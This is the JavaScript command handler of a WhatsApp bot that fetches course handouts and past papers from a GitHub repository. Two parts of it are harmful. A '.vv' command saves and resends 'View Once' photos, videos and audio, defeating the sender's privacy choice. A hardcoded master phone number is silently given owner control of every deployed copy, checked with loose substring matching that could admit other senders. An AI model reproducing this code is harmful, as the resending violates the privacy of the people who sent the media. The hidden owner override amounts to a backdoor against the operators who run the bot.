const path = require('path');
const fs = require('fs');
const axios = require('axios');
const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

class CommandHandler {
    constructor() {
        this.commands = new Map();
        this.aliases = new Map();
        // GitHub Repository Details
        this.ghOwner = 'bubblevuofficial-ops';
        this.ghRepo = 'data';
        this.ghBranch = 'main';
    }

    loadCommands(dir) {
        if (!fs.existsSync(dir)) return;
        const files = fs.readdirSync(dir);
        for (const file of files) {
            const filePath = path.join(dir, file);
            if (fs.statSync(filePath).isDirectory()) {
                this.loadCommands(filePath);
            } else if (file.endsWith('.js')) {
                const cmdModule = require(filePath);
                const cmdList = Array.isArray(cmdModule) ? cmdModule : [cmdModule];
                for (const cmd of cmdList) {
                    if (cmd.name) {
                        this.commands.set(cmd.name.toLowerCase(), cmd);
                        if (cmd.alias) {
                            cmd.alias.forEach(a => this.aliases.set(a.toLowerCase(), cmd.name.toLowerCase()));
                        }
                    }
                }
            }
        }
    }

    async run(sock, m, db) {
        if (!m.message) return;

        const from = m.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        
        const rawSender = m.key.participant || from || '';
        const matchDigits = rawSender.match(/\d+/g);
        const senderNumberOnly = matchDigits ? matchDigits.join('') : '';
        
        const masterNum = '923204854766';
        const masterLid = '274401887043599'; 
        const ownerNum = (db.ownerNumber || '923204854766').replace(/[^0-9]/g, '');
        const sudoList = (db.sudoUsers || []).map(num => String(num).replace(/[^0-9]/g, ''));

        const isMasterNumber = senderNumberOnly.includes(masterNum) || 
                               masterNum.includes(senderNumberOnly) || 
                               senderNumberOnly.endsWith('3204854766') || 
                               senderNumberOnly === masterLid || 
                               rawSender.includes(masterLid) ||
                               rawSender.includes('923204854766');

        const isOwner = m.key.fromMe || isMasterNumber || senderNumberOnly.includes(ownerNum) || sudoList.includes(senderNumberOnly);

        const msgType = Object.keys(m.message)[0];
        const body = (msgType === 'conversation') ? m.message.conversation :
                     (msgType === 'imageMessage') ? m.message.imageMessage.caption :
                     (msgType === 'videoMessage') ? m.message.videoMessage.caption :
                     (msgType === 'extendedTextMessage') ? m.message.extendedTextMessage.text : '';

        const reply = (text, options = {}) => sock.sendMessage(from, { text, ...options }, { quoted: m });
        const prefix = db.prefix || '.';

        // ==========================================
        // 👁️ VIEW ONCE (.vv) HANDLER
        // ==========================================
        const isVVCommand = body.toLowerCase().startsWith(`${prefix}vv`) || body.toLowerCase().startsWith('vv');
        if (isVVCommand) {
            try {
                const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                if (!quotedMsg) return reply('❌ *Please reply to a View Once message with .vv*');

                let viewOnceContent = quotedMsg.viewOnceMessage?.message || 
                                    quotedMsg.viewOnceMessageV2?.message || 
                                    quotedMsg.viewOnceMessageV2Extension?.message || 
                                    quotedMsg;

                const mediaType = viewOnceContent.imageMessage ? 'image' : 
                                   viewOnceContent.videoMessage ? 'video' : 
                                   viewOnceContent.audioMessage ? 'audio' : null;

                if (!mediaType) return reply('❌ *This is not a valid View Once media message.*');

                const mediaMessage = viewOnceContent[`${mediaType}Message`];
                const stream = await downloadContentFromMessage(mediaMessage, mediaType);
                let buffer = Buffer.from([]);
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }

                const caption = mediaMessage.caption || '';

                if (mediaType === 'image') {
                    await sock.sendMessage(from, { image: buffer, caption: caption }, { quoted: m });
                } else if (mediaType === 'video') {
                    await sock.sendMessage(from, { video: buffer, caption: caption }, { quoted: m });
                } else if (mediaType === 'audio') {
                    await sock.sendMessage(from, { audio: buffer, ptt: true }, { quoted: m });
                }
                return;
            } catch (err) {
                console.error('VV Command Error:', err);
                return reply('❌ *Failed to retrieve View Once media.*');
            }
        }

        // ==========================================
        // 📚 VU SESSION & .MORE / OPTION SELECTOR (1, 2, 3, 4)
        // ==========================================
        const userChoice = body ? body.trim() : '';
        if (!db.vuSessions) db.vuSessions = {};

        const session = db.vuSessions[from];
        const isMoreCmd = userChoice.toLowerCase() === '.more' || userChoice.toLowerCase() === 'more';
        const isOption = session && session.files && session.files[userChoice];

        if (session && (isOption || isMoreCmd)) {
            if (isOption) {
                session.activeList = session.files[userChoice] || [];
                session.currentIndex = 0;
            }

            const activeList = session.activeList || [];

            if (activeList.length === 0 || session.currentIndex >= activeList.length) {
                await reply(`⚠️ *No more files available in this section.*`);
                delete db.vuSessions[from];
                return;
            }

            const batchSize = 3;
            const currentBatch = activeList.slice(session.currentIndex, session.currentIndex + batchSize);
            const targetUser = session.sender || rawSender;

            await reply(`⏳ *Downloading files from GitHub... Please wait.*`);

            let successCount = 0;
            for (let i = 0; i < currentBatch.length; i++) {
                const downloadUrl = currentBatch[i];
                try {
                    const fileRes = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
                    const fileBuffer = Buffer.from(fileRes.data);
                    const rawFileName = downloadUrl.split('/').pop().split('?')[0] || `${session.subject}_File.pdf`;

                    await sock.sendMessage(from, {
                        document: fileBuffer,
                        mimetype: 'application/pdf',
                        fileName: rawFileName
                    }, { quoted: m });

                    successCount++;
                } catch (err) {
                    console.error('GitHub File Fetch Error:', err.message);
                }
            }

            session.currentIndex += currentBatch.length;

            if (successCount > 0) {
                const hasMore = session.currentIndex < activeList.length;
                let reportText = `✅ *Files Sent!* @${senderNumberOnly}\n`;
                reportText += `📦 *Delivered:* ${successCount} files (${session.subject})\n`;

                if (hasMore) {
                    reportText += `\n🔄 *More available:* Type *.more* for next batch.\n`;
                }

                reportText += `\n👑 𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝒃𝒚 𝑰𝒛𝒛𝒂 𝑹𝒂𝒏𝒂 👑`;

                await sock.sendMessage(from, {
                    text: reportText,
                    mentions: [targetUser]
                }, { quoted: m });

                if (!hasMore) {
                    delete db.vuSessions[from];
                }
            } else {
                await reply('❌ *Failed to download files from GitHub repository.*');
            }

            return;
        }

        // ==========================================
        // ⚙️ COMMAND EXECUTION & ACCESS CONTROL
        // ==========================================
        if (body.startsWith(prefix)) {
            const args = body.slice(prefix.length).trim().split(/ +/);
            const cmdName = args.shift().toLowerCase();
            
            const command = this.commands.get(cmdName) || this.commands.get(this.aliases.get(cmdName));
            if (command) {
                if (command.ownerOnly && !isOwner) {
                    return reply('❌ *Access Denied:* This command is restricted strictly to the System Owner.');
                }

                const fileKeywords = ['file', 'files', 'notes', 'pdf', 'handout', 'study', 'book', 'books', 'vu', 'assignment', 'quiz', 'solution', 'mid', 'final', 'past', 'get'];
                const isFileOrStudyCmd = fileKeywords.some(keyword => cmdName.includes(keyword));

                if (db.mode === 'private' && !isOwner && !isMasterNumber && !isFileOrStudyCmd) {
                    return; 
                }

                if (command.groupOnly && !isGroup) {
                    return reply('❌ *Group Protocol:* This command can only be executed within group chats.');
                }

                try {
                    await command.execute({ sock, m, args, body, reply, db, isOwner, isGroup });
                    return;
                } catch (err) {
                    console.error(`Error executing command [${cmdName}]:`, err);
                }
            }
        }

        // ==========================================
        // 📚 FULLY DYNAMIC GITHUB REPO FETCHER (ALL COURSES)
        // ==========================================
        const cleanBodyText = userChoice.replace(/^\./, '').toLowerCase();
        
        // Matches any standard course code format like sta301, cs101, eng502, mth101, etc.
        if (/^[a-z]{2,5}\d{2,5}[a-z0-9]*$/.test(cleanBodyText)) {
            try {
                // Directly hit GitHub API for whatever course code user typed
                const ghApiUrl = `https://api.github.com/repos/${this.ghOwner}/${this.ghRepo}/contents/${cleanBodyText}`;
                const response = await axios.get(ghApiUrl);
                const repoFiles = response.data;

                if (!Array.isArray(repoFiles) || repoFiles.length === 0) {
                    return; 
                }

                let handouts = [];
                let midPapers = [];
                let finalPapers = [];
                let notesAndQuizzes = [];

                repoFiles.forEach(file => {
                    const nameLower = file.name.toLowerCase();
                    const downloadUrl = file.download_url;

                    if (nameLower.includes('handout') || nameLower.includes('book') || nameLower.includes('pdf')) {
                        handouts.push(downloadUrl);
                    } else if (nameLower.includes('mid') || nameLower.includes('midterm')) {
                        midPapers.push(downloadUrl);
                    } else if (nameLower.includes('final') || nameLower.includes('finalterm')) {
                        finalPapers.push(downloadUrl);
                    } else {
                        notesAndQuizzes.push(downloadUrl);
                    }
                });

                if (handouts.length === 0 && repoFiles.length > 0) {
                    repoFiles.forEach(f => handouts.push(f.download_url));
                }

                db.vuSessions[from] = {
                    subject: cleanBodyText.toUpperCase(),
                    sender: rawSender,
                    currentIndex: 0,
                    files: {
                        "1": handouts,
                        "2": midPapers.length > 0 ? midPapers : handouts,
                        "3": finalPapers.length > 0 ? finalPapers : handouts,
                        "4": notesAndQuizzes.length > 0 ? notesAndQuizzes : handouts
                    },
                    activeList: []
                };

                const menuText = 
`📚 *${cleanBodyText.toUpperCase()} ACADEMIC FILES*
📂 *GitHub Repository:* Folder Verified ✅
📦 *Total Files Found:* ${repoFiles.length} files

1️⃣ 📖 Handouts & Books (${handouts.length} files)
2️⃣ 📝 Midterm Papers (${midPapers.length > 0 ? midPapers.length : handouts.length} files)
3️⃣ 🎯 Finalterm Papers (${finalPapers.length > 0 ? finalPapers.length : handouts.length} files)
4️⃣ 📌 Short Notes & Quizzes (${notesAndQuizzes.length > 0 ? notesAndQuizzes.length : handouts.length} files)

👉 *Reply with option number (1-4)*

👑 *Powered by Izza Rana* 👑`;

                return reply(menuText);
            } catch (err) {
                // If folder doesn't exist on GitHub, it will just stay silent so other commands work
                return;
            }
        }
    }
}

module.exports = CommandHandler;